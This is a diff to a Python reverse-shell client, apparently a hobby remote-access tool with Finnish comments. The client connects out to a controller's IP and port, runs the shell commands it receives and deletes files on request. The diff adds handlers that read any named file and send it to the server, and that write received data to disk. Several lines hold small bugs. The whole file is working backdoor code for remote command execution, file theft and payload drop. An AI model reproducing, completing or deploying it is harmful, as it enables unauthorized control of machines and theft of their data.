@@ -2,7 +2,7 @@ import socket
 import subprocess
 import os
 import pyautogui
-
+import time
 
 class MainClient:
     def __init__(self, ip:str, port:int):
@@ -10,7 +10,7 @@ class MainClient:
         self.port = port
         self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.s.connect((self.ip, self.port))
-    
+            
     def delete(self, s, command):
         s = self.s
         filename = command.split()[1]
@@ -20,18 +20,28 @@ class MainClient:
         else:
             s.send(b'file not found')
 
-    def upload(self, s,command):
+    def upload(self, s, output_data):
         s = self.s
-        filename = command.split()[1]
-        if os.path.exists(filename):
-            with open(filename, 'rb') as f:
-                bits = f.read(1024)
-                while len(bits) > 0:
-                    s.send(bits)
-                    bits = f.read(1024)
-                s.send(b'DONE')
-        else:
-            s.send(b'File not found')
+        self.size_of_data = str(len(output_data))
+        s.send(bytes(self.size_of_data,'utf8'))
+        time.sleep(2)
+        s.send(bytes(output_data))
+
+    def send_data(self, s, output_data):
+        s = self.s
+        self.size_of_data = str(len(output_data))
+        s.send(bytes(self.size_of_data,'utf8'))
+        time.sleep(2)
+        s.send(output_data)
+
+    def recv_data(self):
+        s = self.s
+        original_size = s.recv(2048).decode('utf-8')
+        original_size = int(original_size)
+        data = s.recv(2048)
+        while len(data) != original_size:
+            data = data + s.recv(2048)
+        return data
 
     def change_dir(self, s,command):
         #splitataan välilyönneistä ja otetaan indeksi 1 talteen
@@ -85,6 +95,21 @@ class MainClient:
             # elif command.startswith('upload'):
             #     upload(s,command)
             #     continue
+            elif command[:8] == 'download':
+                try:
+                    with open(command[9:], 'rb') as data:
+                        data_read = data.read()
+                except FileNotFoundError:
+                    
+                    self.send_data(b'not found')
+                else:
+                    self.send_data(data_read)
+                    continue
+            elif command[:6] == 'upload':
+                data = self.recv_data()
+                with open(command[7:], 'wb') as write_data:
+                    write_data.write(data)
+                    continue
             else:
                 #ajetaan komento sekä lähetetään tulos serverille. 
                 self.run_command(s,command)
